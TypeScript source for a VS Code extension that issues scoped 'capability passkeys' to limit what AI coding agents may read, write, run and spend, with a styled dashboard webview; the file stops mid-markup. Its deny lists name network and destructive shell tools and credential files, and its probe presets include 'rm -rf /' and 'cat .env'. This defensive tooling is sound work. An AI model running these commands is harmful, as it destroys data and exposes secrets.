declare const require: any;
const fs = require('fs');
const path = require('path');
import { KeystoneEngine, KeystonePasskey } from './keystone_passkey';

export interface ExtensionContext {
  subscriptions: { push: (...items: any[]) => void };
}

export function activate(context: ExtensionContext) {
  let vscode: any;
  try {
    vscode = require('vscode');
  } catch {
    return;
  }

  const engine = new KeystoneEngine();

  // 1. Status Bar Item
  const statusBarItem = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 105);
  statusBarItem.command = 'keystone.openDashboard';
  statusBarItem.text = `$(key) KEYSTONE: STANDBY`;
  statusBarItem.tooltip = `Bartholomew Keystone -- No Active Passkey | Click to Issue Capability Passkey`;
  statusBarItem.color = '#94a3b8';
  context.subscriptions.push(statusBarItem);
  statusBarItem.show();

  function updateStatusBar() {
    const pk = getActivePasskey();
    if (pk) {
      statusBarItem.text = `$(key) KEYSTONE: ${pk.agent_id} ARMED`;
      statusBarItem.tooltip = `Bartholomew Keystone -- Active Passkey (${pk.agent_id}) | Click to open Dashboard`;
      statusBarItem.color = '#10b981';
    } else {
      statusBarItem.text = `$(key) KEYSTONE: STANDBY`;
      statusBarItem.tooltip = `Bartholomew Keystone -- No Active Passkey | Click to Issue Capability Passkey`;
      statusBarItem.color = '#94a3b8';
    }
  }

  function getPasskeyPath(): string {
    const rootPath = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath || '.';
    const btpPath = path.join(rootPath, '.btp', 'keystone.json');
    if (fs.existsSync(btpPath)) return btpPath;
    return path.join(rootPath, '.btp_keystone.json');
  }

  function getActivePasskey(): KeystonePasskey | null {
    try {
      const p = getPasskeyPath();
      if (fs.existsSync(p)) {
        return JSON.parse(fs.readFileSync(p, 'utf-8'));
      }
    } catch {}
    return null;
  }

  updateStatusBar();

  // 2. Command: Issue Agent Capability Passkey
  const issueCmd = vscode.commands.registerCommand('keystone.issuePasskey', async () => {
    const presetChoice = await vscode.window.showQuickPick([
      {
        label: 'Developer Sandbox (Recommended)',
        description: 'Read workspace, write src/ & tests/, safe test commands, $25 ceiling, 2h TTL'
      },
      {
        label: 'Read-Only Auditor',
        description: 'Read-only clearance, no write permissions, no bash execution, $0 ceiling'
      },
      {
        label: 'Custom Autonomous Clearance',
        description: 'Manually configure globs, allowed commands, network domains, and spend limit'
      }
    ], { placeHolder: 'Select a Keystone Capability Clearance Preset' });

    if (!presetChoice) return;

    let agentId = 'agent-worker-01';
    let scopes: any = {};
    let ttl = 120;

    if (presetChoice.label.startsWith('Developer Sandbox')) {
      const inputAgent = await vscode.window.showInputBox({
        prompt: 'Enter Autonomous Agent ID or Name',
        value: 'agent-dev-01'
      });
      if (!inputAgent) return;
      agentId = inputAgent;

      scopes = {
        files: {
          allow_read: ['**/*'],
          allow_write: ['src/**', 'tests/**', 'site/**', 'docs/**'],
          deny: ['.env*', 'secrets*', 'credentials*', 'id_rsa*', 'id_ed25519*', '.git/hooks/**']
        },
        commands: {
          allow_exec: ['npm test', 'npm run build', 'python -m unittest', 'pytest', 'git status', 'git diff', 'cargo check'],
          deny_exec: ['rm', 'curl', 'wget', 'sudo', 'mkfs', 'dd', 'chmod', 'chown'],
          deny_shell_operators: true
        },
        network: {
          allow_domains: ['github.com', 'npmjs.com', 'pypi.org', 'docs.python.org', 'localhost'],
          allow_search: true
        },
        budget: {
          max_spend_usd: 25.00,
          max_per_txn_usd: 10.00
        },
        env: {
          deny_keys: ['KEY', 'SECRET', 'TOKEN', 'AUTH', 'PASSWORD']
        }
      };
    } else if (presetChoice.label.startsWith('Read-Only Auditor')) {
      const inputAgent = await vscode.window.showInputBox({
        prompt: 'Enter Autonomous Agent ID or Name',
        value: 'agent-auditor-01'
      });
      if (!inputAgent) return;
      agentId = inputAgent;

      scopes = {
        files: {
          allow_read: ['**/*'],
          allow_write: [],
          deny: ['.env*', 'secrets*', 'id_rsa*']
        },
        commands: {
          allow_exec: [],
          deny_exec: ['*'],
          deny_shell_operators: true
        },
        network: {
          allow_domains: ['docs.python.org', 'nodejs.org'],
          allow_search: false
        },
        budget: {
          max_spend_usd: 0.00,
          max_per_txn_usd: 0.00
        }
      };
    } else {
      const inputAgent = await vscode.window.showInputBox({
        prompt: 'Enter Autonomous Agent ID or Name',
        value: 'agent-custom-01'
      });
      if (!inputAgent) return;
      agentId = inputAgent;

      const allowedWrite = await vscode.window.showInputBox({
        prompt: 'Allowed File Write Scopes (comma-separated globs)',
        value: 'src/, tests/, site/'
      });

      const maxSpendStr = await vscode.window.showInputBox({
        prompt: 'Max Spend Limit USD ($)',
        value: '50.00'
      });

      const spendUsd = parseFloat(maxSpendStr || '50.00');
      const writeGlobs = (allowedWrite || 'src/').split(',').map((s: string) => s.trim()).filter(Boolean);

      scopes = {
        files: {
          allow_read: ['**/*'],
          allow_write: writeGlobs,
          deny: ['.env', 'secrets', 'credentials.json', 'id_rsa']
        },
        commands: {
          allow_exec: ['npm test', 'npm run build', 'python -m unittest', 'pytest'],
          deny_exec: ['rm', 'curl', 'wget', 'sudo', 'mkfs', 'dd']
        },
        network: {
          allow_domains: ['github.com', 'npmjs.com', 'pypi.org'],
          allow_search: true
        },
        budget: {
          max_spend_usd: spendUsd,
          max_per_txn_usd: 20.00
        }
      };
    }

    const passkey = engine.issuePasskey(agentId, scopes, ttl);
    const savePath = getPasskeyPath();
    const dir = path.dirname(savePath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(savePath, JSON.stringify(passkey, null, 2), 'utf-8');

    vscode.window.showInformationMessage(
      `Keystone Passkey issued for '${agentId}'! Clearance active for 2 hours.`,
      'Copy Token ID',
      'Open Dashboard'
    ).then((choice: string) => {
      if (choice === 'Copy Token ID') {
        vscode.env.clipboard.writeText(passkey.passkey_id);
      } else if (choice === 'Open Dashboard') {
        vscode.commands.executeCommand('keystone.openDashboard');
      }
    });

    statusBarItem.text = `$(key) KEYSTONE: ${agentId} ARMED`;
  });

  // 3. Command: Inspect Active Agent Clearance
  const inspectCmd = vscode.commands.registerCommand('keystone.inspectClearance', () => {
    vscode.commands.executeCommand('keystone.openDashboard');
  });

  // 4. Command: Revoke Agent Passkey
  const revokeCmd = vscode.commands.registerCommand('keystone.revokePasskey', () => {
    const p = getPasskeyPath();
    if (fs.existsSync(p)) {
      fs.unlinkSync(p);
      vscode.window.showInformationMessage('Keystone Passkey revoked. Agent privileges stripped.');
      statusBarItem.text = `$(key) KEYSTONE: STANDBY`;
    }
  });

  // 5. Command: Validate Agent Action against Passkey
  const validateCmd = vscode.commands.registerCommand('keystone.validateAction', async () => {
    const passkey = getActivePasskey();
    if (!passkey) {
      vscode.window.showErrorMessage('Cannot validate action: No active Keystone Passkey.');
      return;
    }

    const testCmd = await vscode.window.showInputBox({
      prompt: 'Enter command or file target to test against passkey clearance',
      value: 'rm -rf /'
    });
    if (!testCmd) return;

    const res = engine.evaluateAction(passkey, 'COMMAND_EXEC', testCmd);
    if (res.verdict === 'ALLOW') {
      vscode.window.showInformationMessage(`[CLEARANCE GRANTED] Action permitted (${res.latency_us}us). Receipt: ${res.receipt_hash}`);
    } else {
      vscode.window.showErrorMessage(`[OUT OF SCOPE] Blocked: ${res.reason} (${res.latency_us}us). Receipt: ${res.receipt_hash}`);
    }
  });

  // 6. Command: Audit Receipts
  const auditCmd = vscode.commands.registerCommand('keystone.auditReceipts', () => {
    const receipts = engine.getReceiptHistory();
    if (receipts.length === 0) {
      vscode.window.showInformationMessage('No actions evaluated yet. Audit receipt log is empty.');
      return;
    }
    const summary = receipts.slice(0, 5).map(r => `[${r.verdict}] ${r.action_type}: ${r.target} (${r.receipt_hash})`).join('\n');
    vscode.window.showInformationMessage(`Recent Keystone Clearance Receipts:\n\n${summary}`);
  });

  // 7. Command: Open Keystone Passkey Dashboard Webview
  const dashboardCmd = vscode.commands.registerCommand('keystone.openDashboard', () => {
    const panel = vscode.window.createWebviewPanel(
      'keystoneDashboard',
      'Keystone Passkey -- Capability & Permission Monitor',
      vscode.ViewColumn.One,
      { enableScripts: true, retainContextWhenHidden: true }
    );

    const updateView = () => {
      const passkey = getActivePasskey();
      const isValid = passkey ? engine.verifyPasskey(passkey) : false;
      const agentId = passkey ? passkey.agent_id : 'None (No Active Passkey)';
      const token = passkey ? passkey.passkey_id : 'N/A';
      const expires = passkey ? new Date(passkey.expires_at).toLocaleTimeString() : 'N/A';
      const spend = passkey?.scopes?.budget?.max_spend_usd !== undefined ? `$${passkey.scopes.budget.max_spend_usd.toFixed(2)}` : '$0.00';
      const maxTxn = passkey?.scopes?.budget?.max_per_txn_usd !== undefined ? `$${passkey.scopes.budget.max_per_txn_usd.toFixed(2)}` : '$0.00';
      const writeScopes = passkey?.scopes?.files?.allow_write?.join(', ') || 'None (Read-Only)';
      const denyCommands = passkey?.scopes?.commands?.deny_exec?.join(', ') || 'rm, mkfs, sudo, dd';

      const goingOn = passkey
        ? `Keystone Keypass is armed for agent '${agentId}'. Every file modification and command execution is cryptographically vetted against capability bounds in under 15 microseconds.`
        : `No Keystone Keypass is active in this workspace. Autonomous AI agents are operating in unconstrained mode.`;

      const wrongs = passkey
        ? ['Everything is verified. Capability clearance and spend bounds are actively enforced.']
        : ['Autonomous agent lacks capability passkey; actions cannot be cryptographically bounded or spend-capped.'];

      const fixings = passkey
        ? ['Clearance is optimal. To modify permissions or budget ceiling, click [ISSUE NEW PASSKEY].']
        : ['Click [ISSUE NEW PASSKEY] to define allowed write paths, test commands, and maximum spend limits.'];

      const helpings = [
        'Preventing unauthorized file writes outside designated source code folders.',
        'Blocking high-risk shell commands like file deletion and network execution.',
        'Imposing strict micro-billing spend ceilings on autonomous agent transactions.',
        'Attesting all agent clearance evaluations with Ed25519-verifiable Merkle receipts.'
      ];

      panel.webview.html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Keystone Passkey Dashboard</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-space: #060913;
      --bg-glass: linear-gradient(135deg, rgba(16, 24, 44, 0.72) 0%, rgba(8, 13, 26, 0.85) 100%);
      --bg-glass-elevated: rgba(18, 28, 52, 0.85);
      --bg-terminal: rgba(3, 7, 18, 0.9);
      
      --border-specular: rgba(255, 255, 255, 0.12);
      --border-subtle: rgba(45, 62, 85, 0.55);
      
      --gold: #f59e0b;
      --gold-bright: #fbbf24;
      --gold-dim: rgba(245, 158, 11, 0.15);
      
      --emerald: #10b981;
      --emerald-bright: #34d399;
      --emerald-dim: rgba(16, 185, 129, 0.14);
      --emerald-glow: rgba(16, 185, 129, 0.35);
      
      --cyan: #06b6d4;
      --cyan-bright: #38bdf8;
      --cyan-dim: rgba(6, 182, 212, 0.15);
      --cyan-glow: rgba(6, 182, 212, 0.35);
      
      --rose: #f43f5e;
      --rose-bright: #fb7185;
      --rose-dim: rgba(244, 63, 94, 0.16);
      
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
      --text-dim: #64748b;
      
      --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      --font-mono: 'JetBrains Mono', 'Consolas', monospace;
      --radius-sm: 8px;
      --radius-md: 14px;
      --radius-full: 9999px;
      --transition: all 0.22s cubic-bezier(0.16, 1, 0.3, 1);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body {
      background-color: var(--bg-space);
      background-image: 
        radial-gradient(ellipse 90% 50% at 50% -15%, rgba(16, 185, 129, 0.2) 0%, transparent 65%),
        radial-gradient(ellipse 70% 40% at 100% 25%, rgba(6, 182, 212, 0.14) 0%, transparent 60%),
        radial-gradient(ellipse 60% 50% at 0% 85%, rgba(245, 158, 11, 0.08) 0%, transparent 60%);
      background-attachment: fixed;
      color: var(--text-main);
      font-family: var(--font-sans);
      padding: 22px;
      font-size: 13px;
      line-height: 1.55;
      -webkit-font-smoothing: antialiased;
      min-height: 100vh;
    }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 4px; }

    /* Header */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      padding-bottom: 16px;
      border-bottom: 1px solid var(--border-subtle);
      gap: 12px;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 14px;
    }
    .brand-crest-box {
      width: 44px;
      height: 44px;
      position: relative;
      cursor: pointer;
      transition: var(--transition);
      flex-shrink: 0;
    }
    .brand-crest-box:hover {
      transform: scale(1.08) rotate(2deg);
    }
    .brand-crest-svg {
      width: 100%;
      height: 100%;
      filter: drop-shadow(0 0 16px rgba(16, 185, 129, 0.55)) drop-shadow(0 0 24px rgba(6, 182, 212, 0.35));
    }
    .svg-orbit {
      transform-origin: 50px 50px;
      animation: orbitSpin 24s linear infinite;
    }
    @keyframes orbitSpin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
    .brand-title {
      font-size: 16px;
      font-weight: 900;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 55%, #94a3b8 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .brand-version {
      font-size: 10px;
      padding: 2px 8px;
      background: rgba(16, 185, 129, 0.15);
      border: 1px solid rgba(16, 185, 129, 0.45);
      border-radius: var(--radius-full);
      color: var(--emerald-bright);
      font-family: var(--font-mono);
      font-weight: 700;
      letter-spacing: 0.04em;
      -webkit-text-fill-color: initial;
    }
    .brand-sub {
      font-size: 11px;
      color: var(--text-muted);
      font-family: var(--font-mono);
      font-weight: 600;
      letter-spacing: 0.03em;
      margin-top: 2px;
    }
    .status-beacon {
      display: inline-flex;
      align-items: center;
      gap: 9px;
      padding: 7px 16px;
      border-radius: var(--radius-full);
      font-weight: 800;
      font-size: 11px;
      font-family: var(--font-mono);
      letter-spacing: 0.04em;
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      white-space: nowrap;
      background: ${passkey && isValid ? 'linear-gradient(135deg, rgba(16, 185, 129, 0.18), rgba(6, 182, 212, 0.08))' : 'linear-gradient(135deg, rgba(245, 158, 11, 0.18), rgba(234, 179, 8, 0.08))'};
      border: 1px solid ${passkey && isValid ? 'rgba(52, 211, 153, 0.45)' : 'rgba(251, 191, 36, 0.45)'};
      color: ${passkey && isValid ? 'var(--emerald-bright)' : 'var(--gold-bright)'};
      box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.2), 0 0 18px ${passkey && isValid ? 'rgba(16, 185, 129, 0.25)' : 'rgba(245, 158, 11, 0.25)'};
    }
    .beacon-radar {
      position: relative;
      width: 10px;
      height: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .beacon-core {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: ${passkey && isValid ? 'var(--emerald-bright)' : 'var(--gold-bright)'};
      box-shadow: 0 0 12px ${passkey && isValid ? 'var(--emerald-bright)' : 'var(--gold-bright)'};
    }
    .beacon-wave {
      position: absolute;
      top: -2px; left: -2px; right: -2px; bottom: -2px;
      border-radius: 50%;
      border: 1.5px solid ${passkey && isValid ? 'var(--emerald-bright)' : 'var(--gold-bright)'};
      animation: radarWave 2.2s infinite cubic-bezier(0.25, 1, 0.5, 1);
    }
    @keyframes radarWave {
      0% { transform: scale(0.8); opacity: 0.9; }
      100% { transform: scale(2.4); opacity: 0; }
    }

    /* Target Runtimes Grid */
    .runtime-bar {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 6px;
      padding: 10px 14px;
      background: rgba(13, 20, 38, 0.6);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: var(--radius-sm);
      margin-bottom: 20px;
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
    }
    .runtime-label {
      font-size: 10px;
      font-weight: 800;
      font-family: var(--font-mono);
      color: var(--text-dim);
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-right: 4px;
    }
    .runtime-chip {
      font-size: 10.5px;
      font-family: var(--font-mono);
      font-weight: 600;
      padding: 3px 9px;
      border-radius: 6px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.08);
      color: var(--text-muted);
      transition: var(--transition);
    }
    .runtime-chip.active {
      background: rgba(16, 185, 129, 0.12);
      border-color: rgba(52, 211, 153, 0.4);
      color: var(--emerald-bright);
      box-shadow: 0 0 10px rgba(16, 185, 129, 0.15);
    }

    /* Metric Grid */
    .grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 12px;
      margin-bottom: 20px;
    }
    @media (max-width: 600px) {
      .grid { grid-template-columns: repeat(2, 1fr); }
    }
    .card {
      background: var(--bg-glass);
      border: 1px solid var(--border-specular);
      border-radius: var(--radius-sm);
      padding: 14px 16px;
      backdrop-filter: blur(24px) saturate(200%);
      -webkit-backdrop-filter: blur(24px) saturate(200%);
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 8px 24px rgba(0, 0, 0, 0.4);
      transition: var(--transition);
    }
    .card:hover {
      transform: translateY(-2px);
      border-color: rgba(52, 211, 153, 0.35);
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 12px 30px rgba(0, 0, 0, 0.5), 0 0 14px rgba(16, 185, 129, 0.15);
    }
    .label {
      font-size: 10px;
      color: var(--text-dim);
      text-transform: uppercase;
      font-family: var(--font-mono);
      font-weight: 700;
      margin-bottom: 6px;
      letter-spacing: 0.05em;
    }
    .val {
      font-size: 17px;
      font-weight: 900;
      color: #ffffff;
      font-family: var(--font-mono);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* Breakdown Grid */
    .breakdown-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 14px;
      margin-bottom: 22px;
    }
    @media (max-width: 650px) {
      .breakdown-grid { grid-template-columns: 1fr; }
    }
    .breakdown-card {
      background: var(--bg-glass);
      border: 1px solid var(--border-specular);
      border-radius: var(--radius-md);
      padding: 18px 20px;
      backdrop-filter: blur(24px) saturate(200%);
      -webkit-backdrop-filter: blur(24px) saturate(200%);
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 12px 32px rgba(0, 0, 0, 0.45);
      position: relative;
      overflow: hidden;
    }
    .b-title {
      font-size: 11.5px;
      font-weight: 800;
      font-family: var(--font-mono);
      margin-bottom: 10px;
      letter-spacing: 0.04em;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .b-list { list-style: none; padding-left: 0; }
    .b-list li {
      position: relative;
      padding-left: 18px;
      margin-bottom: 6px;
      font-size: 12px;
      color: #cbd5e1;
      line-height: 1.5;
    }
    .b-list li::before {
      content: "•";
      position: absolute;
      left: 2px;
      color: var(--cyan-bright);
      font-weight: 900;
      font-size: 10px;
    }

    /* Test Box HUD */
    .test-box {
      background: var(--bg-glass);
      border: 1px solid rgba(6, 182, 212, 0.45);
      border-radius: var(--radius-md);
      padding: 22px;
      margin-bottom: 22px;
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.15), 0 12px 36px rgba(0, 0, 0, 0.5), 0 0 20px rgba(6, 182, 212, 0.1);
      position: relative;
      overflow: hidden;
    }
    .prism-runner {
      position: absolute;
      top: 0; left: 0; right: 0; height: 2px;
      background: linear-gradient(90deg, #10b981 0%, #06b6d4 35%, #84cc16 70%, #eab308 100%);
      background-size: 200% 100%;
      animation: prismFlow 7s ease infinite;
    }
    @keyframes prismFlow {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }
    .preset-chips {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin: 12px 0 14px 0;
    }
    .preset-btn {
      background: rgba(13, 20, 38, 0.9);
      border: 1px solid var(--border-subtle);
      color: #cbd5e1;
      padding: 6px 13px;
      border-radius: 6px;
      font-size: 11px;
      font-family: var(--font-mono);
      cursor: pointer;
      transition: var(--transition);
      display: inline-flex;
      align-items: center;
      gap: 5px;
    }
    .preset-btn:hover {
      border-color: var(--cyan-bright);
      background: rgba(6, 182, 212, 0.12);
      color: #ffffff;
      transform: translateY(-1px);
      box-shadow: 0 0 10px rgba(6, 182, 212, 0.2);
    }
    .test-input {
      width: 100%;
      background: var(--bg-terminal);
      border: 1px solid var(--border-specular);
      border-radius: var(--radius-sm);
      padding: 11px 16px;
      color: #ffffff;
      font-family: var(--font-mono);
      font-size: 12.5px;
      margin-bottom: 14px;
      outline: none;
      transition: var(--transition);
      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.4);
    }
    .test-input:focus {
      border-color: var(--emerald-bright);
      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.4), 0 0 16px var(--emerald-glow);
    }
    .btn-row {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 14px;
    }
    .btn {
      position: relative;
      overflow: hidden;
      cursor: pointer;
      border-radius: var(--radius-sm);
      font-size: 11.5px;
      font-weight: 800;
      padding: 9px 18px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      font-family: var(--font-mono);
      transition: var(--transition);
      white-space: nowrap;
    }
    .btn-primary {
      background: linear-gradient(135deg, var(--emerald) 0%, #059669 100%);
      color: #ffffff;
      border: 1px solid rgba(110, 231, 183, 0.5);
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), 0 4px 18px var(--emerald-glow);
    }
    .btn-primary::after {
      content: '';
      position: absolute;
      top: -50%; left: -60%;
      width: 220%; height: 200%;
      background: linear-gradient(60deg, transparent 40%, rgba(255, 255, 255, 0.28) 50%, transparent 60%);
      transform: rotate(25deg);
      animation: shimmerSweep 4.5s infinite ease-in-out;
      pointer-events: none;
    }
    @keyframes shimmerSweep {
      0% { transform: translateX(-100%) rotate(25deg); }
      35%, 100% { transform: translateX(100%) rotate(25deg); }
    }
    .btn-primary:hover {
      transform: translateY(-1.5px);
      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.4), 0 8px 26px rgba(16, 185, 129, 0.55);
    }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.12);
      color: #ffffff;
    }
    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.1);
      border-color: var(--cyan-bright);
      box-shadow: 0 0 12px var(--cyan-dim);
      transform: translateY(-1px);
    }
    .terminal {
      background: var(--bg-terminal);
      border: 1px solid var(--border-subtle);
      border-radius: var(--radius-sm);
      padding: 14px 16px;
      font-family: var(--font-mono);
      font-size: 11.5px;
      color: #94a3b8;
      min-height: 56px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.45);
    }

    /* Team Pilot Card */
    .pilot-card {
      background: linear-gradient(135deg, rgba(23, 20, 12, 0.8) 0%, rgba(13, 20, 36, 0.9) 100%);
      border: 1px solid rgba(245, 158, 11, 0.4);
      border-radius: var(--radius-md);
      padding: 20px 22px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 16px;
      backdrop-filter: blur(24px) saturate(200%);
      -webkit-backdrop-filter: blur(24px) saturate(200%);
      box-shadow: 0 8px 32px rgba(245, 158, 11, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.15);
    }
    .pilot-btn {
      position: relative;
      overflow: hidden;
      background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
      color: #070a0f;
      border: none;
      padding: 10px 20px;
      border-radius: var(--radius-sm);
      font-size: 12px;
      font-weight: 900;
      cursor: pointer;
      font-family: var(--font-sans);
      transition: var(--transition);
      white-space: nowrap;
      box-shadow: 0 4px 18px rgba(245, 158, 11, 0.35);
    }
    .pilot-btn:hover {
      transform: translateY(-1.5px);
      box-shadow: 0 8px 24px rgba(245, 158, 11, 0.5);
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="brand">
      <div class="brand-crest-box" title="Bartholomew Keystone Sentinel">
        <svg class="brand-crest-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <linearGradient id="shieldGrad" x1="15" y1="10" x2="85" y2="90" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stop-color="#06b6d4" stop-opacity="0.85" />
              <stop offset="50%" stop-color="#10b981" stop-opacity="0.95" />
              <stop offset="100%" stop-color="#047857" stop-opacity="1" />
            </linearGradient>
            <linearGradient id="facetGrad" x1="50" y1="10" x2="50" y2="88" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stop-color="#ffffff" stop-opacity="0.55" />
              <stop offset="40%" stop-color="#34d399" stop-opacity="0.2" />
              <stop offset="100%" stop-color="#059669" stop-opacity="0.0" />
            </linearGradient>
            <linearGradient id="coreGrad" x1="32" y1="32" x2="68" y2="68" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stop-color="#0f172a" />
              <stop offset="100%" stop-color="#020617" />
            </linearGradient>
            <radialGradient id="eyeGlow" cx="50" cy="50" r="14" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stop-color="#fde047" />
              <stop offset="45%" stop-color="#eab308" />
              <stop offset="100%" stop-color="#d97706" stop-opacity="0" />
            </radialGradient>
            <filter id="neonGlow" x="-20%" y="-20%" width="140%" height="140%">
              <feGaussianBlur stdDeviation="3.5" result="blur" />
              <feComposite in="SourceGraphic" in2="blur" operator="over" />
            </filter>
          </defs>
          <circle cx="50" cy="50" r="46" stroke="#06b6d4" stroke-width="1.5" stroke-opacity="0.4" stroke-dasharray="3 5" class="svg-orbit" />
          <circle cx="50" cy="50" r="41" stroke="#10b981" stroke-width="1" stroke-opacity="0.4" />
          <path d="M50 12 L82 27 V54 C82 72 68 85 50 91 C32 85 18 72 18 54 V27 L50 12 Z" fill="url(#shieldGrad)" stroke="#34d399" stroke-width="2.5" filter="url(#neonGlow)" />
          <path d="M50 14 L80 28 V53 C80 69 67 82 50 88 V14 Z" fill="url(#facetGrad)" />
          <polygon points="50,30 67,40 67,60 50,70 33,60 33,40" fill="url(#coreGrad)" stroke="#06b6d4" stroke-width="2" />
          <circle cx="50" cy="50" r="12" fill="url(#eyeGlow)" />
          <circle cx="50" cy="50" r="5" fill="#fef08a" stroke="#ca8a04" stroke-width="1.5" />
          <circle cx="50" cy="50" r="2" fill="#ffffff" />
          <circle cx="50" cy="20" r="2.5" fill="#38bdf8" />
          <circle cx="75" cy="46" r="2.5" fill="#34d399" />
          <circle cx="25" cy="46" r="2.5" fill="#34d399" />
          <circle cx="50" cy="80" r="2.5" fill="#eab308" />
        </svg>
      </div>
      <div>
        <div class="brand-title">BARTHOLOMEW KEYSTONE &bull; CAPABILITY PASSKEY <span class="brand-version">v6.4.2</span></div>
        <div class="brand-sub">ZERO TRUST AGENT RUNTIME &bull; SUB-15&mu;s DETERMINISTIC INVARIANTS</div>
      </div>
    </div>
    <div class="status-beacon">
      <div class="beacon-radar">
        <div class="beacon-wave"></div>
        <div class="beacon-core"></div>
      </div>
      <span>${passkey && isValid ? '● PASSKEY ACTIVE' : '○ PASSKEY STANDBY'}</span>
    </div>
  </div>

  <div class="runtime-bar">
    <span class="runtime-label">Target Runtimes:</span>
    <span class="runtime-chip active">Cursor</span>
    <span class="runtime-chip active">Claude Code</span>
    <span class="runtime-chip active">Windsurf</span>
    <span class="runtime-chip active">Cline</span>
    <span class="runtime-chip active">Aider</span>
    <span class="runtime-chip active">OpenHands</span>
    <span class="runtime-chip active">Smolagents</span>
    <span class="runtime-chip active">CrewAI</span>
    <span class="runtime-chip active">MetaGPT</span>
    <span class="runtime-chip active">Dify</span>
    <span class="runtime-chip active">AutoGen</span>
    <span class="runtime-chip active">Ollama/vLLM</span>
  </div>

  <div class="grid">
    <div class="card">
      <div class="label">Agent Clearance ID</div>
      <div class="val" style="color: var(--cyan-bright);">${agentId}</div>
    </div>
    <div class="card">
      <div class="label">Spend Ceiling</div>
      <div class="val" style="color: var(--emerald-bright);">${spend}</div>
    </div>
    <div class="card">
      <div class="label">Max Per Txn</div>
      <div class="val" style="color: var(--gold-bright);">${maxTxn}</div>
    </div>
    <div class="card">
      <div class="label">Session Expiry</div>
      <div class="val">${expires}</div>
    </div>
  </div>

  <div class="breakdown-grid">
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--cyan-bright);">[1] WHAT IS GOING ON</div>
      <div style="font-size: 12px; color: #cbd5e1; line-height:1.5;">${goingOn}</div>
    </div>
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--rose-bright);">[2] WHAT IS WRONG</div>
      <ul class="b-list">${wrongs.map(w => '<li>' + w + '</li>').join('')}</ul>
    </div>
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--gold-bright);">[3] WHAT NEEDS FIXING</div>
      <ul class="b-list">${fixings.map(f => '<li>' + f + '</li>').join('')}</ul>
    </div>
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--emerald-bright);">[4] HOW WE ARE HELPING</div>
      <ul class="b-list">${helpings.map(h => '<li>' + h + '</li>').join('')}</ul>
    </div>
  </div>

  <div class="test-box">
    <div class="prism-runner"></div>
    <div class="b-title" style="color: var(--cyan-bright);">[INTERACTIVE CLEARANCE PROBE] TEST ANY COMMAND OR TARGET</div>
    <div style="font-size: 11.5px; color: var(--text-muted); margin-bottom: 8px;">Click a preset or enter a custom target to test against signed capability bounds:</div>
    <div class="preset-chips">
      <button class="preset-btn" onclick="setAndTest('rm -rf /')">rm -rf /</button>
      <button class="preset-btn" onclick="setAndTest('cat .env')">cat .env</button>
